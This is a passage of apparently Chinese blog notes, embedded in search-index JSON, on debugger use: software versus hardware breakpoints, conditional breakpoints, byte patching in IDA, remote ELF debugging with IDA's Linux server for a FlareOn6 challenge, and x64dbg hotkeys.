打开找到刚才打下的断点后右键Edit编辑勾选Hardware 差别： 1. 实现原理： 软件断点： 软件断点是通过修改程序指令来实现的。在代码中插入一个特定的中断指令（例如，在x86架构中是INT 3指令）。 调试器会记录被替换的原始指令，并在程序继续执行时恢复它。 硬件断点： 硬件断点不需要修改程序代码。 2. 资源限制： 软件断点： 软件断点在数量上没有严格的限制，可以在程序中的任意位置设置。 硬件断点： CPU提供的硬件断点寄存器数量有限，因此可以同时设置的硬件断点数量也有限。（最多四个） 3. 使用场景： 软件断点： 软件断点适用于大多数调试场景，特别是在需要设置大量断点时。 硬件断点： 硬件断点适用于以下场景： 调试无法修改代码的程序，例如只读内存中的代码。 调试需要精确控制执行流程的程序，例如内核代码或驱动程序。 调试数据断点，就是当某个内存地址被读取或者写入的时候出发断点，这是硬件断点特有的功能。 4. 隐蔽性： 软件断点： 软件断点会修改程序代码，因此可能会被一些反调试技术检测到。 硬件断点： 硬件断点不会修改程序代码，因此具有更高的隐蔽性。 总结： 软件断点灵活方便，适用于大多数调试场景，但可能会被反调试技术检测到。 硬件断点隐蔽性高，适用于特殊调试场景，但数量有限 条件断点 条件断点是一种在调试器中设置的断点，它仅在满足特定条件时才会触发。在框位置输入条件 更改字节选中要更改的那个字节 右键 更改之后Apply patch to 应用这个补丁 [FlareOn6]Overlong elf文件动态调试1.找到ida的根目录，找到dbgsrv文件，在该文件中找到 根据elf文件的进制选择（以64进制和snake.elf为例） 将linux server64和snake拖入文件夹中 之后在虚拟机终端内输出chmod +x linux_server64赋予文件执行权利 之后输入./linux_server64运行文件（之后等待主机连接） 再打开一个终端输入ip addr获取虚拟机ip地址 检测是否可以成功： 打开主机终端输入 ping +虚拟机ip(下图即为来连接成功) 之后打开Debugger&gt;Process options&gt; 1:填snake在虚拟机中的位置 2：填snake在虚拟机所在文件的文件位置 3：填虚拟机ip 4:运行.&#x2F;linux_server64后，输出Listening on 0.0.0.0:23946（一般默认） 之后就可以正常运行（下次运行时在此运行.&#x2F;linux_server64，并把文件拖入想相同目录即可） 显示所有机器码：​ Options&gt;general&gt;改为10 x64dbgF2：设置断点。）F4：运行到光标处F7：单步步入。（遇到call指令，进入call函数的实现处继续执行汇编指令）F8：单步步过。（遇到call指令，执行call函数，之后接着执行call指令的下一条指令）F9：运行程序（如果没有碰到断点，程序会一直执行到结束。） Ctrl+F9: 执行到函数返回处，用于跳出函数实现 Alt+F9:执行到用户代码，用于快速跳出系统函数 Ctrl+G:输入十六进制地址，快速定位到该地址处","categories":[],"tags":[{"name":"动调","slug":"动调","permalink":"http://example.com/tags/%E5%8A%A8%E8%B0%83/"}]}],"categories":[],"tags":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/tags/pwn-study/"},{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"栈迁移","slug":"栈迁移","permalink":"http://example.com/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"},{"name":"小端序","slug":"小端序","permalink":"http://example.com/tags/%E5%B0%8F%E7%AB%AF%E5%BA%8F/"},{"name":"Canary","slug":"Canary","permalink":"http://example.com/tags/Canary/"},{"name":"gdb","slug":"gdb","permalink":"http://example.com/tags/gdb/"},{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/tags/ctfshow/"},{"name":"mprotect","slug":"mprotect","permalink":"http://example.com/tags/mprotect/"},{"name":"ret2libc2_x64","slug":"ret2libc2-x64","permalink":"http://example.com/tags/ret2libc2-x64/"},{"name":"格式化字符串","slug":"格式化字符串","permalink":"http://example.com/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"ret2libc_printf","slug":"ret2libc-printf","permalink":"http://example.com/tags/ret2libc-printf/"},{"name":"栈溢出","slug":"栈溢出","permalink":"http://example.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"},{"name":"RE","slug":"RE","permalink":"http://example.com/tags/RE/"},{"name":"推测","slug":"推测","permalink":"http://example.com/tags/%E6%8E%A8%E6%B5%8B/"},{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"},{"name":"花指令","slug":"花指令","permalink":"http://example.com/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/"},{"name":"NSS","slug":"NSS","permalink":"http://example.com/tags/NSS/"},{"name":"RC4变式","slug":"RC4变式","permalink":"http://example.com/tags/RC4%E5%8F%98%E5%BC%8F/"},{"name":"TEA","slug":"TEA","permalink":"http://example.com/tags/TEA/"},{"name":"SMC","slug":"SMC","permalink":"http://example.com/tags/SMC/"},{"name":"RC4","slug":"RC4","permalink":"http://example.com/tags/RC4/"},{"name":"动调","slug":"动调","permalink":"http://example.com/tags/%E5%8A%A8%E8%B0%83/"}]}